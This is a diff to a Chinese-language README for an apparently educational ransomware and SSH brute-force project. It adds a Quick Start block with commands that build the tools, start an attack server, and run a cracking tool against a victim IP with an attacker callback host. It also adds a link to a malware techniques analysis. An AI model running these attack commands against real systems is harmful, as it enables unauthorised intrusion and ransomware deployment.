@@ -66,6 +66,20 @@ sequenceDiagram
     V->>V: 執行原始 echo 命令
 ```
 
+## 快速開始 (Quick Start)
+
+### 編譯和設定
+```bash
+# 編譯所有程式
+make all
+
+# 啟動攻擊伺服器
+./attack_server <port>
+
+# 執行 SSH 暴力破解
+./crack_attack <victim_ip> <attacker_ip> <attacker_port>
+```
+
 ## 程式碼分析 (Code Analysis)
 
 ### 1. Ransomware Attack (`echo.c`)
@@ -481,3 +495,7 @@ def start_server():
 4. 教育用戶安全最佳實踐
 
 記住，這些技術應該只用於合法的安全研究和教育目的。
+
+---
+
+**詳細技術分析請參考**: [MALWARE_TECHNIQUES_ANALYSIS.md](./MALWARE_TECHNIQUES_ANALYSIS.md)
